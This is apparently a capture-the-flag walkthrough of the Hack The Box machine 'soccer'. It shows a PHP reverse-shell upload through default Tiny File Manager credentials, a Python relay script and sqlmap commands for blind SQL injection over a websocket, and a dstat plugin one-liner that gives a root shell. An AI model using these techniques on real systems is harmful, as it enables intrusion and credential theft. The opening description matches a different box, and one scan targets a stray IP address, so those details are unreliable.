## INTRODUCTION

At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable. 

> It's funny, but some of these seem like really nice templates.

The real action, as the name of the box suggests, is at the admin panel that manages the templates. It's a site for typical web hosting tasks like managing hosts, editing DNS, adding users, etc.

**Warning: This walkthrough contains many spoilers.**
**No spoilers will be unexpected if you read the walkthrough sequentially.

## RECON

I followed my typical first steps. I set up a directory for the box, with a ``nmap`` subdirectory. Then set $RADDR to my target machine's IP, and scanned it with my typical nmap "init" scan:

```bash
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR 
```

> ##### My "init" nmap scan: explained
>
> This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
>
> **-sV**  Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running.
> **-sC**  Default script scan; shorthand for ``--script=default``
> **-O**    Enable OS detection. Nmap makes its best guess to fingerprint the target.
> **-n**     Disable DNS resolution: we don't need hostnames. Speeds up the scan greatly.
> **-Pn**   Skip host discovery, which is unnecessary if we're targeting just one host.
> **-oA**   Output results in all formats, to the ``nmap/init-scan`` directory.

```

Nmap revealed three services:

- SSH on port 22
- HTTP server on port 80
- *Some unknown service* on port 9091



### Webserver Strategy

Results of the strategy will be summarized at the end of the section.

1. Add the target to **/etc/hosts**.

   ```bash
   echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts
   ```

   > :point_up: I use ``tee`` instead of the append operator ``>>`` so that I don't accidentally blow away my ``/etc/hosts`` file with a typo of ``>`` when I meant to write ``>>``.

   

2. Download the source code & **extract all the links**.

   Omitted here because it was not helpful for this box. At a high level, this is the process I usually follow:

   1. Use ``wget`` to download a copy of the target domain
   2. Use ``strings`` to extract all strings from the source code
   3. Use regex to parse all strings. I look for text following an ``href`` attribute and anything with ``http`` or ``https``

   

3. Perform **vhost enumeration** on the target.

   ```bash
   ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H "Host: FUZZ.soccer.htb" -c -t 40 -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404
   ```

   

4. Perform **subdomain enumeration** on the target.

   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.soccer.htb -c -t 40 -timeout 4 -ic -ac
   ```

   

5. Perform **directory enumeration** on the target domain and any domains collected in steps (3) or (4).

   ```bash
   feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://soccer.htb -A -d 1 -t 100 -T 4 --burp --smart
   ```

> - For vhost and subdomain enumeration, ANY RESULTS may be important. 
> - For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages.

6. Check each page for a ``form`` with a POST method, using the list of pages from directory enumeration. I use a handy tool called **Selenium Oxide**. Below is a snippet that shows how I do this:

   ```python
   exploit = ExploitBuilder('http', addr, use_proxy=args.proxy) 
   with open(f'./{dirname}/discovered_uris.txt', 'r') as f:
       for f_url in f:
           # Change subdomains
           if addr != f'{baseurl(f_url)}:{port}':
               # then skip this result
               # [omitted]
           exploit.driver.maximize_window()
           exploit.get(f'/{page(f_url)}')
           # Only examine sites that have a form that does a POST
           forms = exploit.driver.find_elements(By.CSS_SELECTOR, 'form[method="POST"]')
           user = SeO2User()
           for frm in forms:
               print(f'\nExamining form: {frm.get_attribute("outerHTML")}\n')
               inputs = frm.find_elements(By.CSS_SELECTOR, 'input')
               # [omitted]
   ```

   > Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.

   

7. Do **banner-grabbing** on the target. 

   ```bash
   whatweb $RADDR && curl -IL $RADDR
   ```

   

8. Check **Wappalyzer**, a tool used for identifying the underlying technologies of a website. I use the official **Wappalyzer** plugin for firefox.

Notable results from enumeration of this box included the following:

```
No VHosts or subdomains were found.

200      GET     http://soccer.htb/ground3.jpg
200      GET     http://soccer.htb/ground4.jpg
200      GET     http://soccer.htb/ground2.jpg
200      GET     http://soccer.htb/ground1.jpg
200      GET     http://soccer.htb/
301      GET     http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET     http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/

nginx 1.18.0, Ubuntu, PHP
```



### Exploring the website

The `/tiny` directory brings us to a file manager login page:

![Tiny file manager login](Tiny%20file%20manager%20login.png)

Then, by attempting a login to `/tiny` was redirected to here, actually the same thing:

```
http://soccer.htb/tiny/tinyfilemanager.php
```

Attempting to navigate to `/tiny/uploads` shows a standard nginx *403 Forbidden* page:

![tiny uploads forbidden](tiny%20uploads%20forbidden.png)



## FOOTHOLD

On the `/tiny/tinyfilemanager.php` page, there is a link at the bottom: Â© [CCP Programmers](https://tinyfilemanager.github.io/) that leads to the github page of the Tiny File manager source code. Thankfully, there is some documentation regarding installation and configuration. 

In the [Security and User Management](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management) section, the default credentials are shown:

- **admin : admin@123**
- **user : 12345**

Trying the **admin** credentials on ``/tiny/tinyfilemanager.php`` leads to a successful login:

![tiny logged in](tiny%20logged%20in.png)

Clearly, the site runs PHP, so let's try using ``php-reverse-shell.php``

> :point_up: This reverse shell is built in to kali, found at ``/usr/share/webshells/php/php-reverse-shell.php``. Remember to modify it for your current IP and the port of your reverse shell's listener.

Remember to set a new firewall rule for the reverse shell (and heck, while we're at it, do one for a webserver too):

```bash
sudo ufw allow from 10.10.11.194 to any port 4444 proto tcp
sudo ufw allow from 10.10.11.194 to any port 8000 proto tcp
```

Then establish the listener

```bash
bash
nc -lvnp 4444
```

We can then attempt to upload the reverse shell using the page's *upload* widget:

![revshell upload fail](revshell%20upload%20fail.png)

But unfortunately, uploading directly to `/var/www/html` isnt possible because the directory is not writeable. I'm sure that `/tiny/uploads` directory will work though:

![revshell upload success](revshell%20upload%20success.png)

:thinking: Hmm... Even after "uploading" it, it still doesn't seem to be uploaded. Upload from URL doesn't seem to work either.

However, clicking the **New Item** button in the top right of the page allows you to create a new directory. It seems possible to create a new directory in `/tiny/uploads`, so I created `/tiny/uploads/test` and uploaded the same reverse shell to there:

![upload actual success](upload%20actual%20success.png)

The reverse shell can then be triggered by performing an http request to http://soccer.htb/tiny/uploads/test/php-reverse-shell.php or simply by clicking the **Direct Link** button (second from the right in the Actions column.)

:smile: And now we have a reverse shell, as ``www.data``!

![www-data revshell](www-data%20revshell.png)



### Upgrading the Shell

I originally learned this procedure [from this blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.

 Starting with the "dumb" shell, change from ``sh`` to ``bash``:

```bash
SHELL=/bin/bash script -q /dev/null
```

> You'll have a better prompt now, but still no tab completion and still no ability to use things like ``less`` or ``vi``. Let's fix that:

```bash
[ctrl+z]
stty raw -echo
fg [enter] [enter]
export TERM=xterm256-color
```

The shell will be backgrounded, then enable echo mode with ``stty``, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours :rainbow:.



## USER FLAG

### www-data

So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to take the following steps:


### Linux foothold strategy

1. Run ``id``. Find out what groups this user is in. Locate the user within ``/etc/passwd`` if possible; see if they have a shell and/or ``home`` directory.

   ```bash
   id && cat /etc/passwd | grep $USER
   ```

   

2. Check if the user can sudo

   ``` bash
   sudo -l
   ```

   

3. Check locations that are writable by the user or its group

   ```bash
   find / -user [username] 2>/dev/null
   find / -group [groupname] 2>/dev/null
   ```

   

4. Does the user already have any useful tools?

   ```bash
   which nc netcat socat python perl php
   ```

   

5. Check for any active and listening sockets

   ```bash
   netstat -tulpn | grep LISTEN
   ```

   > :point_up: also try ``netstat -antp``

   

6. Does the user have anything in cron?

   ```bash
   crontab -l
   ```

   

7. Does the system or root have anything in cron?

   ```bash
   cat /etc/crontab
   ls -laR /etc/cron*
   ```

   

8. Find any SUID or SGID executables that are accessible by the user

   ```bash
   find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null | grep -v '/proc'
   ```

   

9. Download the toolbox (not covered in-depth here).

   > My toolbox includes **linpeas**, **linenum**, **pspy**, and **chisel**. 
   >
   > Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target. 
   >
   > I've prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.

   

10. Run **pspy** and take a look at any running processes. Since **pspy** is closed with ``ctrl+c``, and your reverse shell may not be fully interactive, it is best to run this on a timeout:

    ```bash
    timeout 5m ./pspy
    ```

    

11. Run pre-scripted enumeration tools, such as **LinEnum** or **linpeas**

    ```bash
    ./LinEnum.sh
    ./linpeas.sh -w
    ```



I only did steps (1) through (5) and saved the rest for later. Notable results from the foothold strategy included the following:

- (1) revealed that there are two important users on the box: `www-data` and `player`. `player` has a home directory,  so that's probably where the flag is.
- (3) revealed that `www-data` is pretty locked-down. They can only write to `/var/lib/nginx/*` and to the directory I just created `/var/www/html/tiny/uploads/test`
- (4) revealed that `nc`, `netcat`, `perl`, and `php` are present.
- (5) revealed a few unexpected things:
  ![netstat](netstat.png)
  **SSH**, **HTTP** server, and that mysterious service on **9091** are all running, we knew that already. 
  But there is also **3306 (MySQL)** and **33060** (an interface to MySQL using the 'x-protocol'). 
  Additionally, something listening on **port 3000**: often a development copy of a webserver, in my experience.
- (11) linpeas showed something interesting:
  ![player doas root](player%20doas%20root.png)



### Port 3000

As I guessed, this appears to be a webserver on port 3000. I'm not sure if it's under development, but it seems very similar to the original **soccer.htb** website. The biggest difference is that there is more in the navbar:

```bash
curl localhost:3000
```

```
...
	<body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
            <div class="container-fluid">

            </style>
        </header>
...
```



### Port 9091

I was curious about what was running on port 9091, so I tried connecting to it using `nc $RADDR 9091`. After making a request, it was clear that it was running http. 

To investigate, I'll searching for any of the nginx directories:

```bash
find / -name nginx* -type d 2>/dev/null
```

```
/usr/share/doc/nginx-common
/usr/share/doc/nginx-core
/usr/share/doc/nginx
/usr/share/nginx
/usr/lib/nginx
/sys/fs/cgroup/blkio/system.slice/nginx.service
/sys/fs/cgroup/pids/system.slice/nginx.service
/sys/fs/cgroup/devices/system.slice/nginx.service
/sys/fs/cgroup/cpu,cpuacct/system.slice/nginx.service
/sys/fs/cgroup/memory/system.slice/nginx.service
/sys/fs/cgroup/systemd/system.slice/nginx.service
/sys/fs/cgroup/unified/system.slice/nginx.service
/var/lib/nginx
/var/log/nginx
/etc/nginx
```

Remembering that configuration files are usually stored in `/etc`, I'll look there first. 

![etc nginx](etc%20nginx.png)

`nginx.conf` does not seem to contain anything out of the ordinary. `conf.d` is empty. I checked `sites-enabled`, which contained two files:

```
www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb
```

Well that's odd. `soc-player.htb` seems like it would be an alternate domain running on this box. I'll take a look at the configuration file:

```
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
        listen 80;
        listen [::]:80;
        server_name soc-player.soccer.htb;
        root /root/app/views;
        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }
}
```

Well how about that... very interesting. It's the website running on port 3000! 

Based on the **server_name** property, there should be a subdomain that didn't appear during my subdomain fuzzing: ``soc-player.soccer.htb``. I added this new subdomain to my ``/etc/hosts`` file and tried navigating to the website:

![soc-player](soc-player.png)

:thinking: That page looks a lot like ``soccer.htb`` did, but with some extra menu items. Having found a new subdomain, I'll perform directory enumeration on it:

![soc-player directory enum](soc-player%20directory%20enum.png)

Checking out the site a bit, many things are guiding me towards signup. I'm signing up as **donjohe@mail.mail**, **donjohe / password**:

![signup](signup.png)

After signing up and logging-in to the user I just created, I'm presented with the `/check` page. It has form with a single text field, so I'll try submitting something and catching it with Burp:

![check page](check%20page.png)

The form submission was caught in my Burp proxy:

![check page submission burp](check%20page%20submission%20burp.png)

There! That's what port 9091 is for!

Forwarding this request resulted in a short message from ther server: "Ticket Doesn't Exist". This was also shown on the `/check` page:

![ticket does not exit](ticket%20does%20not%20exit.png)

Worth noting that this is not the typical `x-www-form-urlencoded` form that we usually see. This one uses a websocket (with port 9091). See below for the source: 

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;

### Websocket Fun Times

I haven't ever had to pentest a websockets-based application before, so I read up on it a bit from [this Hacktricks page](https://book.hacktricks.xyz/pentesting-web/cross-site-websocket-hijacking-cswsh). To fingerprint and search for known vulnerabilities, the Hacktricks page suggests [a tool called STEWS](https://github.com/PalindromeLabs/STEWS). I downloaded the tool and tool and tried it out, first with the *fingerprinting* module:

![ws fingerprinting 1](ws%20fingerprinting%201.png)

![ws fingerprinting 2](ws%20fingerprinting%202.png)

Ok, that might prove to be useful later. Next I'll try the *vulnerability detection* module:

Test for generic Cross-site WebSocket Hijacking (CSWSH): 

> The other three vulnerabilities that the tool tests for are DoS, so I'm not interested in them for this box

```
ââ$ python3 STEWS-vuln-detect.py -u $RADDR:9091 -n -v -1
   Testing ws://10.10.11.194:9091

>>>Note: ws://10.10.11.194:9091 allowed null origin
>>>Note: ws://10.10.11.194:9091 allowed unusual char (possible parse error)
>>>VANILLA CSWSH DETECTED: ws://10.10.11.194:9091 likely vulnerable to vanilla CSWSH (any origin)
====Full list of vulnerable URLs===
['ws://10.10.11.194:9091']
['>>>VANILLA CSWSH DETECTED: ws://10.10.11.194:9091 likely vulnerable to vanilla CSWSH (any origin)']
```

Unfortunately, like other XSS-adjacent vulnerabilities, this is only useful if I'm attempting to steal data from another user's interaction with the server. And as far as I know, I'm the only user on this box right now :eyes:.

This got me thinking about what kind of vulnerability I really needed to find... :thinking: Clearly this ticket ID is being checked against some database (probably the MySQL database identified earlier). Really, the best thing would be an SQL injection. I did some searching on SQL Injection against websockets, and found [this page talking about it](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) in the context of CTFs. 

> :bulb: Note to self: 
> Could I eavesdrop on the connection from **9091** to MySQL on **3306** (or **33060**)?
> If a new connection is formed for every DB transaction, might be able to grab the connection string that way. Since it's local, that communication is unlikely to be encrypted. I'll check this out later.

I modified the code on that page to take the websocket **server address** (10.10.11.194:9091) and websocket request **parameter** ('id') as arguments. In essence, this script stands up a python webserver on my attacker box, which will take in requests via http then relay them to the target's websocket server. My modified version of that code is shown below:

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import sys

def send_ws(payload, serveraddr, param_name):
	ws_server = f'ws://{serveraddr}'
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"%s":"%s"}' % (param_name, message)
	
	print(f'Sending {data}')

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port, server_addr, parameter, content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload, server_addr, parameter)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


if (len(sys.argv) < 3) :
    print("Usage: ./relay.py [ws host] [parameter] \n   ex. ./relay.py 127.0.0.1:9000 id")
    sys.exit()

addr = sys.argv[1]
param = sys.argv[2]

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081), addr, param)
except KeyboardInterrupt:
	pass
```

On my attacker box, I ran this script. Then in a separate tab I tried making some cURL requests to this server. It worked like a charm:

![ws sqli relay](ws%20sqli%20relay.png)



### SQLMap over Websocket

That's all great, but I could do that already just using Burp. The real goal was to try running SQLmap (which works over http) on this, just like [in the article](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) where I took the original code. Let's see what SQLMap turns up:

![sqlmap 1](sqlmap%201.png)

![sqlmap 2](sqlmap%202.png)

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Don't get me wrong, I'm glad it's injectable, but time-based blind injections take f...o...r...e...v...e...r..... :skull:
Thankfully, we have direct access to the database, so all we really need are some credentials. So instead of dumping the database contents, I'll just obtain the password hashes and get cracking.

After a few hours, finally a few hashes were recovered:

```
database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: $A$005$Qj\x1fA(\\0
[*] mysql.infoschema [1]:
    password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED
[*] mysql.session [1]:
    password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED
[*] mysql.sys [1]:
    password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED
[*] player [1]:
    password hash: *9C66A903EC673FCF95D84CE93691AD526969AA3C
[*] root [1]:
    password hash: NULL
```

That doesn't really inspire confidence...

Ok, back to the original plan: use the **time based blind SQL injection** to see what else MySQL has for us. Of the databases discovered during the previous enumeration attempt, the database **soccer_db** looks most interesting. Let's find out what tables it contains:

```bash
sqlmap -u "http://localhost:8081/?id=1" -p id -D soccer_db --tables --batch
```

> This wasn't too bad, actually. It only took a few minutes.

```
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

Whew, thank goodness: only one table. Let's dump the contents:

```bash
sqlmap -u "http://localhost:8081/?id=1" -p id -D soccer_db -T accounts --dump-all --batch
```

```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

Nice. Storing passwords in plaintext - always a smart move :wink: 
So we've obtained a new credential: **player** / **PlayerOftheMatch2022**

Keeping credential re-use in mind, let's try logging into mysql locally using the above credential:

![mysql successful](mysql%20successful.png)

Success! Now that I'm not waiting hours for a time based blind SQL injection, I'll take a look at the rest of the database.

> Result: aside from **soccer_db**, all tables were mysql system tables. 
> There was no information of immediate importance.

We already know that **SSH** is running on the box, so it makes sense to try the **player** credential there, too. 

:tada: Awesome! That credential was successful for **SSH**. We're now logged in as **player**:

![player ssh](player%20ssh.png)

I've already seen that the flag `user.txt` is in `/home/player`. Time to finally read it:

```bash
cat /home/player/user.txt
```



## ROOT FLAG

### player

Having just obtained access to a new user, I'll go through my usual [Linux foothold strategy](#Linux foothold strategy) and enumerate the user thoroughly. These are the key results:

- `player` cannot `sudo` at all.
- `player` has access to `nc`, `netcat`, `perl`, and `php`.
- (Found while enumerating ``www-data``: There is a notable permission that might be useful, worth investigating
  ![player doas root](player%20doas%20root.png)

I'm not familiar with **doas**, so I did some research on what it is and how it works.

:heart_eyes: It's like `sudo` and `su` rolled together. Like a privilege escalation dream come true. It looks like I can use `doas` as `player` but only with ``/usr/bin/dstat``. I've also never used ``dstat``, but there was some useful [info on GTFObins](https://gtfobins.github.io/gtfobins/dstat/#shell) on how to make use of it. 

Apparently `dstat` can be used for PE because it can load arbitrary python plugins. I'll follow the procedure on how to create a `dstat` "plugin" for privilege escalation:

```bash
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_myplugin.py
doas /usr/bin/dstat --myplugin
```

And... I truly have no idea why that didn't work. Even when changing permissions, or stringing all the commands together into one line (to avoid the possibility of the filesystem cleanup that runs every couple of minutes), I kept getting the same infuriating error message:

```
dstat: option --myplugin not recognized, try dstat -h for a list of all the options
```

WHAT THE HECK?! It's right there!! ``dstat`` even admits to it! According to the ``dstat`` man pages, the plugin can be in any of the following:

`````
~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/
`````

 When I enter ``dstat --list``, this is what I get:

![dstat list](dstat%20list.png)

I don't know what to say. It seems wrong. It lies.

Setting aside my rage, I tried the exact same thing, but using ``/usr/local/share/dstat/dstat_myplugin.py`` instead.
It worked fine.

![dstat pe success](dstat%20pe%20success.png)

:tada: Hooray, a root shell!

Now just simply ``cat`` out the flag to finish the box.



## LESSONS LEARNED

### Attacker

- I accidentally wasted a lot of time on subdomain enumeration. My scans kept returning random subdomains, which would enqueue another sub-subdomain, which would enqueue a sub-sub-subdomain... etc.  
  Keep an eye on your scanning tools, and if something seems wrong, **don't be afraid to revise your usual methods**.
- RTFM. Developers can be a little overstretched, and it's natural for people to cut a few corners. When this happens while critical software is being installed/configured, **they may forget to disable default credentials**. The documentation for open source software can sometimes reveal these credentials.
- In HTB, **cracking hashes is almost never the way**. If you are trying to crack a hash, and can't do the job with just *rockyou*, then you're probably on the wrong track.
- When you reach new milestones in your entry into a system (foothold -> user flag, user -> privesc), remember to **review your notes**. 
  In this box, when I got a shell as `player`, I already knew the trick that I was going to use for privilege escalation (`doas` + `dstat`). 

### Defender

- As a developer, you must **clean up after yourself**. I'm not sure if http://soc-player.soccer.htb/ was under development and http://soccer.htb/ was in production, but there is no reason to have both running concurrently.
- **Security by obscurity is never the answer**. Having a subdomain like http://soc-player.soccer.htb/ slows down an attacker, but any attacker with good enumeration skills will easily find this type of thing.
- **Never store passwords in plaintext**. Does this even need explanation? Better yet, try externalizing the risk by using some kind of SSO service.
- **Avoid granting unnecessary permissions**. There is no reason that `player` needed to be able to `dstat` as root.
